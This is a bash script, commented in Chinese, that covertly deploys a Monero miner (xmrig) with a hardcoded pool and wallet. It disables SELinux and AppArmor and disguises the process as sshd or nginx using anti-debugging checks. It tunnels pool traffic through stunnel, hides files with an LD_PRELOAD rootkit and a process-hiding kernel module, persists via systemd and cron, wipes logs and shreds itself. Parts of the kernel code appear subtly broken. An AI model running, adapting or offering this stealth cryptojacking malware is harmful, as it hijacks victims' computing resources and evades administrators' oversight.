#!/bin/bash

# 隐藏挖矿进程的一键部署脚本（无明显挖矿痕迹，已移除依赖安装）

if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

set -e

# 临时禁用系统限制
if command -v setenforce &> /dev/null; then
    echo "检测到 SELinux，正在临时禁用..."
    setenforce 0 || echo "警告：无法禁用 SELinux"
fi
if command -v aa-status &> /dev/null; then
    echo "检测到 AppArmor，正在临时禁用..."
    systemctl stop apparmor || echo "警告：无法停止 AppArmor"
fi

# 检查必要命令是否存在
for cmd in curl tar gcc make stunnel systemctl shred; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请手动安装所需依赖" 1>&2
        exit 1
    fi
done

# 检查内核头文件
if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
    echo "错误：内核头文件与当前内核版本 $(uname -r) 不匹配，请安装 linux-headers-$(uname -r)" 1>&2
    exit 1
fi

# 用户输入
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录（避免挖矿相关名称）
mkdir -p /opt/httpd-bin /etc/systemd/conf.d /opt/svc-bin /mnt/tmpfs || { echo "创建目录失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin /etc/systemd/conf.d /opt/svc-bin /mnt/tmpfs
mount -t tmpfs tmpfs /mnt/tmpfs || { echo "挂载 tmpfs 失败" 1>&2; exit 1; }

# 下载并安装（立即清理临时文件）
curl -L --retry 3 https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/svc.tar.gz || { echo "下载失败" 1>&2; exit 1; }
tar -xzf /tmp/svc.tar.gz -C /opt/httpd-bin || { echo "解压失败" 1>&2; exit 1; }
mv /opt/httpd-bin/xmrig-6.22.2/xmrig /opt/httpd-bin/httpd-core || { echo "移动文件失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin/httpd-core
rm -rf /opt/httpd-bin/xmrig-6.22.2
shred -u /tmp/svc.tar.gz || rm -f /tmp/svc.tar.gz

# 创建 wrapper（动态进程名与反调试）
cat > /opt/httpd-bin/svc-wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>

const char *names[] = {"sshd", "nginx", "apache2", "systemd", NULL};

int main(int argc, char *argv[]) {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) _exit(0);
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    usleep(1000);
    clock_gettime(CLOCK_MONOTONIC, &end);
    if ((end.tv_nsec - start.tv_nsec) > 2000000) _exit(0);
    FILE *fp = fopen("/proc/cpuinfo", "r");
    char line[256];
    while (fp && fgets(line, sizeof(line), fp)) {
        if (strstr(line, "hypervisor")) { fclose(fp); _exit(0); }
    }
    if (fp) fclose(fp);
    srand(time(NULL));
    int idx = rand() % 4;
    prctl(PR_SET_NAME, names[idx], 0, 0, 0);
    setrlimit(RLIMIT_CORE, &(struct rlimit){0, 0});
    execv("/opt/httpd-bin/httpd-core", argv);
    return 0;
}
EOF
gcc -o /opt/httpd-bin/svc-wrapper /opt/httpd-bin/svc-wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin/svc-wrapper
rm -f /opt/httpd-bin/svc-wrapper.c

# 生成配置文件（使用 tmpfs）
cat > /mnt/tmpfs/svc.conf <<EOF
{
    "pools": [
        {
            "url": "127.0.0.1:8443",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "max-cpu-usage": 50,
    "randomx": {
        "1gb-pages": false,
        "cache-qos": true
    }
}
EOF
chmod 600 /mnt/tmpfs/svc.conf

# 创建 stunnel 配置文件
cat > /etc/stunnel/stunnel.conf <<EOF
[svc]
client = yes
accept = 127.0.0.1:8443
connect = $pool_url
syslog = no
output = /dev/null
sni = www.google.com
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256
curve = secp384r1
EOF
chmod 600 /etc/stunnel/stunnel.conf

# 创建 LD_PRELOAD 文件隐藏库
cat > /opt/svc-bin/hide_files.c <<EOF
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>

static const char *hidden_paths[] = {"/opt/httpd-bin", "/etc/systemd/conf.d", "/opt/svc-bin", "/etc/ld.so.preload", "/mnt/tmpfs", NULL};

static DIR *(*real_opendir)(const char *) = NULL;
static struct dirent *(*real_readdir)(DIR *) = NULL;
static int (*real_stat)(const char *path, struct stat *buf) = NULL;

DIR *opendir(const char *name) {
    if (!real_opendir) real_opendir = dlsym(RTLD_NEXT, "opendir");
    for (int i = 0; hidden_paths[i]; i++) {
        if (strcmp(name, hidden_paths[i]) == 0) return NULL;
    }
    return real_opendir(name);
}

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        int hide = 0;
        for (int i = 0; hidden_paths[i]; i++) {
            if (strstr(entry->d_name, "httpd") || strstr(entry->d_name, "svc") || strstr(entry->d_name, "hide") || strstr(entry->d_name, "ld.so.preload")) {
                hide = 1;
                break;
            }
        }
        if (!hide) return entry;
    }
    return NULL;
}

int stat(const char *path, struct stat *buf) {
    if (!real_stat) real_stat = dlsym(RTLD_NEXT, "stat");
    for (int i = 0; hidden_paths[i]; i++) {
        if (strcmp(path, hidden_paths[i]) == 0 || strstr(path, "httpd") || strstr(path, "svc") || strstr(path, "hide") || strstr(path, "ld.so.preload")) {
            errno = ENOENT;
            return -1;
        }
    }
    return real_stat(path, buf);
}
EOF
gcc -shared -fPIC -o /opt/svc-bin/libhide.so /opt/svc-bin/hide_files.c -ldl || { echo "编译 LD_PRELOAD 失败" 1>&2; exit 1; }
chmod 700 /opt/svc-bin/libhide.so
rm -f /opt/svc-bin/hide_files.c

# 设置全局 LD_PRELOAD
[ -f /etc/ld.so.preload ] && cp /etc/ld.so.preload /etc/ld.so.preload.bak
echo "/opt/svc-bin/libhide.so" > /etc/ld.so.preload || {
    echo "设置 LD_PRELOAD 失败，回滚..." 1>&2
    [ -f /etc/ld.so.preload.bak ] && mv /etc/ld.so.preload.bak /etc/ld.so.preload
    exit 1
}

# 创建用户和组
groupadd -r svc 2>/dev/null || true
useradd -r -s /bin/false -g svc svc 2>/dev/null || { echo "创建用户失败" 1>&2; exit 1; }
chown -R svc:svc /opt/httpd-bin /etc/systemd/conf.d /etc/stunnel /opt/svc-bin /mnt/tmpfs

# 创建内核模块
cat > /opt/svc-bin/hide_pid.c <<EOF
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/sched.h>

static int pid_to_hide = 0;
module_param(pid_to_hide, int, 0644);

static struct proc_dir_entry *proc_root;
static struct file_operations *orig_fops;
static int (*orig_proc_readdir)(struct file *, void *, filldir_t);

int fake_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
    struct task_struct *task = pid_task(find_vpid(pid_to_hide), PIDTYPE_PID);
    if (task && filp->f_pos == task->pid) filp->f_pos++;
    return orig_proc_readdir(filp, dirent, filldir);
}

static int __init hide_pid_init(void) {
    proc_root = proc_root;
    orig_fops = (struct file_operations *)proc_root->proc_fops;
    orig_proc_readdir = orig_fops->readdir;
    orig_fops->readdir = fake_proc_readdir;
    return 0;
}

static void __exit hide_pid_exit(void) {
    orig_fops->readdir = orig_proc_readdir;
}

module_init(hide_pid_init);
module_exit(hide_pid_exit);
MODULE_LICENSE("GPL");
EOF

cat > /opt/svc-bin/Makefile <<EOF
obj-m += hide_pid.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

cd /opt/svc-bin
make || { echo "内核模块编译失败" 1>&2; exit 1; }
[ -f "/sys/module/hide_pid" ] && rmmod hide_pid 2>/dev/null || true
insmod /opt/svc-bin/hide_pid.ko || { echo "加载内核模块失败，可能需禁用 Secure Boot 或签名模块" 1>&2; exit 1; }

# 创建 systemd 服务
cat > /etc/systemd/system/svc.service <<EOF
[Unit]
Description=Service Daemon
After=network.target stunnel4.service

[Service]
User=svc
Group=svc
ExecStart=/opt/httpd-bin/svc-wrapper --threads=1 --config=/mnt/tmpfs/svc.conf
Restart=always
LimitCORE=0
MemoryMax=512M
NoNewPrivileges=true
PrivateTmp=true
ExecStartPost=/bin/sh -c "sleep 1; echo \$\$ > /tmp/svc.pid; echo pid_to_hide=\$(cat /tmp/svc.pid) > /sys/module/hide_pid/parameters/pid_to_hide || true"

[Install]
WantedBy=multi-user.target
EOF
chmod 644 /etc/systemd/system/svc.service

# 启用服务并设置自修复
systemctl enable stunnel4.service || { echo "启用 stunnel 服务失败" 1>&2; exit 1; }
systemctl start stunnel4.service || { echo "启动 stunnel 服务失败" 1>&2; exit 1; }
systemctl daemon-reload || { echo "systemd 重载失败" 1>&2; exit 1; }
systemctl enable svc.service || { echo "启用 svc 服务失败" 1>&2; exit 1; }
systemctl start svc.service || { echo "启动 svc 服务失败" 1>&2; exit 1; }
echo "*/5 * * * * root systemctl is-active svc.service || systemctl restart svc.service" >> /etc/crontab

# 清理日志和痕迹
journalctl --vacuum-time=1s || echo "警告：无法清理 journalctl 日志"
shred -u /tmp/* /opt/httpd-bin/*.tar.gz /opt/svc-bin/hide_pid.c /opt/svc-bin/Makefile 2>/dev/null || rm -f /tmp/* /opt/httpd-bin/*.tar.gz /opt/svc-bin/hide_pid.c /opt/svc-bin/Makefile 2>/dev/null
shred -u "$0" || rm -f "$0"

# 检查服务状态
if systemctl is-active svc.service &> /dev/null && systemctl is-active stunnel4.service &> /dev/null; then
    echo "部署完成！服务运行正常。"
else
    echo "警告：服务未正确启动，请检查 systemctl status"
    exit 1
fi

# 恢复系统限制
if command -v setenforce &> /dev/null; then
    setenforce 1 || echo "警告：无法恢复 SELinux"
fi
if command -v aa-status &> /dev/null; then
    systemctl start apparmor || echo "警告：无法恢复 AppArmor"
fi
